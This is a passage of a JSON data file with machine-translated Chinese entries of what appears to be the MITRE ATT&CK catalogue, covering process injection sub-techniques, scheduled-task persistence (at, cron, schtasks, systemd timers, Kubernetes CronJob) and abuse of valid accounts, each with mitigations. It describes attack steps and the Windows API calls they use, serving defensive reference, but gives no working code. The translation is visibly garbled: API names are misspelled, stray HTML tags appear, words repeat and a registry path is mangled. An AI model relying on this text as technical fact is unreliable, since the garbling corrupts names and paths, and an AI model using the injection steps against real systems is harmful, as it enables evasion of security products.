          "content": "对手可以通过额外的窗口内存（EWM）将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。EWM注入是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在创建窗口之前，基于图形的Windows进程必须规定或注册Windows类，该类规定外观和行为（通过Windows过程，这是处理数据输入/输出的函数）。新Windows类的注册可以包括一个请求，要求将高达40个字节的EWM的请求附加到该类实例的分配内存中。该EWM旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口（API）函数以设置并获取其值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "虽然很小，但EWM足够大，可以存储32位指针，并且通常用于指向Windows过程。恶意软件可能在攻击链的一部分中使用此内存位置，其中包括将代码写入该过程内存的共享部分，将指针放置在EWM中的代码，然后通过将执行控件返回到该过程的EWM中的地址来调用执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过EWM注入授予的执行可能允许访问目标过程的内存和可能提高的特权。为共享部分写有效载荷还避免使用高度监视的API调用，例如"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " createRemoteThreadRead "
        },
        {
          "type": "text",
          "content": "。更复杂的恶意软件样本还可能通过触发Windows过程和其他系统功能的组合来绕开保护机制，例如数据执行预防（DEP），这些功能将在目标过程的可执行文件中重写恶意有效负载。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过EWM注入执行也可以从安全产品中逃避检测，因为在合法过程中掩盖了执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.012",
    "name": "Process Hollowing",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意代码注入悬浮和空心的过程中，以逃避基于过程的防御。流程空心是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "流程空心通常是通过在悬浮状态下创建一个过程然后拆开/空心内存来执行的，然后可以用恶意代码替换。可以使用本机Windows API调用（例如"
        },
        {
          "type": "code",
          "content": " createProcess "
        },
        {
          "type": "text",
          "content": "）创建受害者进程，其中包含一个悬挂流程主线程的标志。此时，可以使用API呼叫（例如"
        },
        {
          "type": "code",
          "content": " ZwunMapViewOfSection "
        },
        {
          "type": "text",
          "content": ">或"
        },
        {
          "type": "code",
          "content": " ntunmapviewofsection "
        },
        {
          "type": "text",
          "content": "）将过程取消启动，然后将其重新调整为注入代码，并通过"
        },
        {
          "type": "code",
          "content": " firtualalocex </代码>， writeProcessMemory "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " setThreadContext "
        },
        {
          "type": "text",
          "content": "，然后分别"
        },
        {
          "type": "code",
          "content": " RESUMETHREAD "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这与线程本地存储非常相似，但创建了一个新过程，而不是针对现有过程。由于注入过程（并因此继承了注射过程），因此这种行为可能不会导致特权提高。但是，由于在合法的过程中掩盖了执行，因此通过流程挖空执行也可以从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.013",
    "name": "Process Doppelgänging",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过流程Doppelgänging将恶意代码注入过程中，以逃避基于过程的防御，并可能提高特权。过程Doppelgänging是在单独的实时过程的地址空间中执行任意代码的一种方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows交易NTFS（TXF）是在Vista中引入的，作为执行安全文件操作的方法。为了确保数据完整性，TXF仅启用一个交易手柄即可在给定时间写入文件。在终止写入手柄交易之前，所有其他处理都与作者隔离，并且只能读取打开手柄时存在的文件的订单版本。为避免损坏，如果系统或应用程序在写入事务期间失败，则TXF执行自动回滚。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管已弃用，但TXF应用程序编程接口（API）仍在Windows 10开始启用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用TXF，以执行无文件注入的变化。类似于过程挖空，过程doppelgänging涉及更换合法过程的记忆，从而使恶意代码的执行可能逃避防御和检测。ProcessDoppelgänging的使用TXF还避免了使用高度监测的API功能，例如"
        },
        {
          "type": "code",
          "content": " ntunmapviewofsection "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " virtualProtectectexex "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " setThreadContext "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ProcessDoppelgänging以4个步骤实施："
        }
      ],
      [
        {
          "type": "list",
          "content": "交易 - 使用合法可执行文件创建TXF事务，然后用恶意代码覆盖文件。这些更改将是孤立的，只有在交易的背景下可见。"
        },
        {
          "type": "list",
          "content": "加载 - 创建一个共享的内存部分，并加载恶意可执行文件。"
        },
        {
          "type": "list",
          "content": "回滚 - 撤消对原始可执行文件的更改，有效地从文件系统中删除了恶意代码。"
        },
        {
          "type": "list",
          "content": "动画 - 从污染的内存部分创建一个过程并启动执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "由于注入过程（并因此继承了注射过程），因此这种行为可能不会导致特权提高。但是，由于在合法的过程中掩盖了执行情况，因此通过ProcessDoppelgänging执行可能会从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.014",
    "name": "VDSO Hijacking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过VDSO劫持将恶意代码注入流程中，以逃避基于过程的防御，并可能提高特权。虚拟动态共享对象（VDSO）劫持是一种在单独的实时过程的地址空间中执行任意代码的方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "VDSO劫持涉及将调用重定向到动态链接的共享库。内存保护可能会阻止通过PTRACE系统调用将可执行代码写入进程。但是，对手可能会劫持从vdso共享对象映射到一个过程中的SYSCALL接口代码存根，以执行SYSCALLS以打开并映射恶意共享对象。然后，可以通过在过程的“全局偏移表中存储”（存储映射库函数的绝对地址）中存储的修补内存地址引用来调用该代码的执行流来调用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在另一个过程的上下文中运行代码可能允许访问该过程的内存，系统/网络资源以及可能提高的特权。通过VDSO劫持的执行也可以从安全产品中逃避检测，因为在合法过程中执行掩盖了。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055.015",
    "name": "ListPlanting",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Process Injection",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用列表视图控件将恶意代码注入被劫持的过程中，以逃避基于过程的防御，并可能提高特权。ListPlanting是在单独的实时过程的地址空间中执行任意代码的一种方法。由于在合法过程中掩盖了执行情况，因此通过清单插入执行的代码也可以从安全产品中逃避检测。"
        }
      ],
      [
        {
          "type": "text",
          "content": "列表视图控件是用于显示项目集合的用户界面窗口。有关应用程序列表视图设置的信息存储在"
        },
        {
          "type": "code",
          "content": " syslistview32 "
        },
        {
          "type": "text",
          "content": "控制的过程的“内存”中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过将代码复制到使用列表视图控制的过程的虚拟地址空间中，然后使用该代码作为自定义回调以对列出的项目进行分类来执行listPlanting（“破碎攻击”的形式）。对手必须首先将代码复制到目标过程的内存空间中，可以执行各种方式，包括直接获取受害者过程窗口的"
        },
        {
          "type": "code",
          "content": " syslistview32 "
        },
        {
          "type": "text",
          "content": "（通过Windows API调用，例如<code，例如<code）> Findwindow </code>和/或<Code> Enumwindows </code>）或其他过程注入方法。"
        }
      ],
      [
        {
          "type": "text",
          "content": "列表插图的一些变化可能会在目标过程中分配内存，但然后使用窗口消息复制有效载荷，以避免使用高度监控的"
        },
        {
          "type": "code",
          "content": " writeProcessMemory "
        },
        {
          "type": "text",
          "content": "函数。例如，对手可以使用"
        },
        {
          "type": "code",
          "content": " postmessage "
        },
        {
          "type": "text",
          "content": "和/或"
        },
        {
          "type": "code",
          "content": " sendmessage "
        },
        {
          "type": "text",
          "content": " api函数来发送"
        },
        {
          "type": "code",
          "content": " lvm_setItemPosition "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " lvm_getItemposition "
        },
        {
          "type": "text",
          "content": " </code> message，meessess，messages，messages，messages，messages，messages，messages，messages，有效地将有效载荷2字节复制到分配的内存。"
        }
      ],
      [
        {
          "type": "text",
          "content": "最后，通过将"
        },
        {
          "type": "code",
          "content": " lvm_sortitems "
        },
        {
          "type": "text",
          "content": "消息发送到"
        },
        {
          "type": "code",
          "content": " syslistview32 "
        },
        {
          "type": "text",
          "content": "该过程窗口的子女，并在新分配的缓冲区中传递并执行为"
        },
        {
          "type": "code",
          "content": " > ListView_sortItems "
        },
        {
          "type": "text",
          "content": "回调。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "可以将某些端点安全解决方案配置为基于注射过程中发生的共同行为序列阻止某些类型的过程注入。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.002",
    "name": "At",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用实用程序，以执行任务计划，以初始或重复执行恶意代码。AT实用程序作为Windows，Linux和MacOS中的可执行文件存在，用于在指定的时间和日期安排任务。尽管对Windows环境中的计划任务的SCHTASK进行了弃用，但使用AT要求运行任务调度程序服务，并且用户将作为本地管理员组的成员登录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，可以由Superuser以及添加到"
        },
        {
          "type": "code",
          "content": " at.allow "
        },
        {
          "type": "text",
          "content": "文件中的任何用户调用。如果"
        },
        {
          "type": "code",
          "content": " at.allow "
        },
        {
          "type": "text",
          "content": "文件不存在，则选中"
        },
        {
          "type": "code",
          "content": " at.deny "
        },
        {
          "type": "text",
          "content": "文件。允许在"
        },
        {
          "type": "code",
          "content": " at.deny "
        },
        {
          "type": "text",
          "content": "中未列出的每个用户名。如果存在"
        },
        {
          "type": "code",
          "content": " at。存在"
        },
        {
          "type": "text",
          "content": "是空的，则允许AT的全局使用。如果两个文件都不存在（通常是基线），则仅允许超级用户使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用AT在系统启动或计划持久的基础上执行程序。也可以滥用AT作为横向移动的一部分进行远程执行和/或在指定帐户（例如系统）的上下文下运行一个过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux环境中，对手也可能会滥用通过使用任务产生交互式系统外壳或运行系统命令来破坏受限环境。类似地，如果允许二进制通过"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "作为超级用户运行，则在特权上也可以使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "诸如PowerSploit框架之类的工具包包含可用于探索系统弱点的系统弱点的动力模块，该系统可用于升级特权。Windows操作系统还创建了一个注册表密钥，该密钥专门与目标主机上的计划任务相关联：Microsoft \\ Windows \\ Windows NT \\ CurrentVersion \\ Schedule \\ Schedule \\ task Cache \\ task Cache \\ tree \\ at1。在Linux和MacOS环境中，可以在本地审核</code>使用<code>的计划任务，也可以通过中央收集的日志记录，使用Syslog或从主机中审核事件进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为计划任务配置设置，以强制任务在身份验证的帐户的上下文中运行，而不是允许它们作为系统运行。关联的注册表密钥位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ Control \\ LSA \\ submitControl "
            },
            {
              "type": "text",
              "content": "。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>安全选项：域控制器：允许服务器操作员安排任务，设置为禁用。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置增加计划优先级选项，以仅允许管理员组安排优先过程的权利。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：增加计划优先级。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能在远程系统上创建计划的任务。在Linux环境中，可以使用"
            },
            {
              "type": "code",
              "content": " at.allow "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " at.deny "
            },
            {
              "type": "text",
              "content": "文件来管理用户帐户级访问</code> at </code>。AT.Allow中列出的用户可以安排使用AT的操作，而在at.deny文件中列出的用户已禁用实用程序。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.003",
    "name": "Cron",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "实用程序以执行任务计划以初始或重复执行恶意代码。"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "实用程序是类似于Unix的操作系统的基于时间的工作调度程序。"
        },
        {
          "type": "code",
          "content": " crontab "
        },
        {
          "type": "text",
          "content": "文件包含要运行的cron条目的时间表以及指定的执行时间。任何"
        },
        {
          "type": "code",
          "content": " crontab "
        },
        {
          "type": "text",
          "content": "文件都存储在操作系统特定的文件路径中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在Linux或Unix环境中使用"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "在系统启动或计划的基础上执行程序以进行持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "查看"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "时间表的更改。"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "可以在"
            },
            {
              "type": "code",
              "content": "/var/log "
            },
            {
              "type": "text",
              "content": "目录中审查执行。要验证"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "日志文件的位置，请在"
            },
            {
              "type": "code",
              "content": " /etc/rsyslog.conf "
            },
            {
              "type": "text",
              "content": " </code>或"
            },
            {
              "type": "code",
              "content": " /etc/syslog.conf </code "
            },
            {
              "type": "text",
              "content": "中检查syslog配置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": ""
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "权限由"
            },
            {
              "type": "code",
              "content": " /etc/cron.allow和/etc/cron.deny "
            },
            {
              "type": "text",
              "content": "控制。如果有一个"
            },
            {
              "type": "code",
              "content": " cron.allow "
            },
            {
              "type": "text",
              "content": "文件，则需要在文件中列出"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "的用户或用户。"
            },
            {
              "type": "code",
              "content": " cron.deny "
            },
            {
              "type": "text",
              "content": "用于明确禁止用户使用cron。如果两者都不存在，则只允许超级用户运行cron。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.005",
    "name": "Scheduled Task",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Windows任务调度程序，以执行任务计划以初始或重复执行恶意代码。有多种方法可以访问Windows中的任务调度程序。Schtasks实用程序可以直接在命令行上运行，也可以在控制面板的管理员工具部分中通过GUI打开任务调度程序。在某些情况下，对手已经为Windows任务调度程序使用了.NET包装器，或者，对手使用Windows NetApi32库来创建计划的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手（例如：at）也可能会滥用实用程序的弃用，尽管"
        },
        {
          "type": "code",
          "content": " at.exe "
        },
        {
          "type": "text",
          "content": "无法访问用"
        },
        {
          "type": "code",
          "content": " schtasks "
        },
        {
          "type": "text",
          "content": "或控制面板创建的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用Windows任务调度程序在系统启动或计划的基础上执行程序以进行持久性。Windows任务调度程序还可以滥用以作为横向移动的一部分进行远程执行和/或在指定帐户的上下文（例如系统）下运行过程。与系统二进制代理执行类似，对手也滥用了Windows任务调度程序，以在签名/受信任的系统流程下可能掩盖一次性执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以创建“隐藏”的计划任务（即隐藏文物），这些任务可能不可见，用于列举任务的工具和手动查询。具体而言，对手可以通过删除关联的安全描述符（SD）注册表值（必须使用系统权限完成此值的删除）来隐藏"
        },
        {
          "type": "code",
          "content": " schtasks /Query < /code < /code < /code>和任务调度程序的任务。对手也可以采用替代方法隐藏任务，例如更改关联注册表密钥中的元数据（例如 index "
        },
        {
          "type": "text",
          "content": "值）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "诸如PowerSploit框架之类的工具包包含可用于探索系统弱点的系统弱点的动力模块，该系统可用于升级特权。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为计划任务配置设置，以强制任务在身份验证的帐户的上下文中运行，而不是允许它们作为系统运行。关联的注册表密钥位于HKLM \\ System \\ CurrentControlset \\ Control \\ LSA \\ submitControl。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>安全选项：域控制器：允许服务器操作员安排任务，设置为禁用。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置增加计划优先级选项，以仅允许管理员组安排优先过程的权利。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：增加计划优先级。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能在远程系统上创建计划的任务。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.006",
    "name": "Systemd Timers",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用SystemD计时器来执行任务计划，以初始或重复执行恶意代码。SystemD计时器是具有文件扩展名"
        },
        {
          "type": "code",
          "content": " .timer "
        },
        {
          "type": "text",
          "content": "该控制服务的单位文件。可以将计时器设置为在日历事件上或相对于起点的时间跨度之后运行。它们可以用作Linux环境中CRON的替代方案。可以通过"
        },
        {
          "type": "code",
          "content": " systemctl "
        },
        {
          "type": "text",
          "content": "命令行实用程序来远程激活SystemD计时器，该实用程序可通过SSH运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "每个"
        },
        {
          "type": "code",
          "content": " .timer "
        },
        {
          "type": "text",
          "content": "文件必须具有相应的"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "带有相同名称的文件，例如"
        },
        {
          "type": "code",
          "content": " example.timer "
        },
        {
          "type": "text",
          "content": " and code> example.service.service.service </代码>。"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件是由SystemD System和Service Manager管理的SystemD Service单元文件。特权计时器写入"
        },
        {
          "type": "code",
          "content": "/etc/systemd/system/"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/usr/lib/lib/systemd/system "
        },
        {
          "type": "text",
          "content": "时，用户级别写入"
        },
        {
          "type": "code",
          "content": "〜/.config/systemd/用户/"
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用SystemD计时器在系统启动或计划的基础上执行恶意代码。使用特权路径安装的计时器可用于维持根级持久性。对手也可以安装用户级计时器以实现用户级别的持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户创建和/或修改SystemD Timer单元文件。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对SystemD "
            },
            {
              "type": "code",
              "content": " .timer "
            },
            {
              "type": "text",
              "content": "单元文件的读/写入访问仅选择有合法需要管理系统服务的特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将对系统实用程序（例如“ SystemCtl”或“ SystemD-run””等系统实用程序的访问限制为有合法需求的用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.007",
    "name": "Container Orchestration Job",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用由容器编排工具（例如Kubernetes）提供的任务调度功能，以安排配置为执行恶意代码的容器的部署。集装箱编排作业在特定的日期和时间运行这些自动任务，类似于Linux系统上的Cron作业。此类型的部署也可以配置为随着时间的推移维护数量的容器，从而自动化了在集群中保持持久性的过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Kubernetes中，可以使用Cronjob来安排运行一个或多个容器以执行特定任务的作业。因此，对手可以利用cronjob安排在集群中各个节点中执行恶意代码的作业部署。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保默认情况下的容器不作为根。在Kubernetes环境中，考虑定义POD安全标准，以防止POD运行特权容器。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能创建集装箱编排作业。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.001",
    "name": "Default Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得默认帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。默认帐户是一个内置的OS，例如Windows系统上的来宾或管理员帐户。默认帐户还包括其他类型的系统，软件或设备（包括AWS中的root用户帐户和kubernetes中的默认服务帐户）上的默认工厂/提供商集帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认帐户不仅限于客户端机器，还包括用于设备（例如内部，开源或商业）等设备（例如网络设备和计算机应用程序）的帐户。带有用户名和密码组合的电器对不更改安装后的组织构成了严重威胁，因为它们是对手的容易目标。同样，对手也可以利用公开披露或被盗的私钥或凭证材料来合法地通过远程服务连接到远程环境。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.002",
    "name": "Domain Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得和滥用域帐户的证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。域帐户是由Active Directory域服务管理的域帐户，在该服务域服务中，在该域的一部分中配置了访问和权限。域帐户可以涵盖用户，管理员和服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过各种方式（例如OS凭据转储或重复使用密码重复使用）妥协域帐户，其中一些域名具有高度特权，从而允许访问该域的特权资源。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得对手获得广泛访问的情况。除非受到严格控制并分割帐户的使用，否则请勿将用户或管理域帐户跨系统组合放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。如果获得帐户凭据，则限制整个系统的凭据重叠，以防止访问。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.003",
    "name": "Local Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得当地帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的手段。本地帐户是由组织配置的，供用户使用，远程支持，服务或单个系统或服务上的管理。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当地帐户也可能被滥用，以通过OS凭证倾销来提高特权和收获凭据。密码重复使用可能允许在网络上滥用一组机器，以进行特权升级和横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审核本地帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。限制用于日常运营的本地管理员帐户的使用，这些帐户可能会使它们暴露于潜在的对手。"
            }
          ],
          [
            {
              "type": "text",
              "content": "例如，审核在Kubernetes中使用服务帐户的使用，并避免自动授予他们访问Kubernetes API（如果不需要）。实施圈量也可能有助于防止在域上重用本地管理员凭据。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.004",
    "name": "Cloud Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
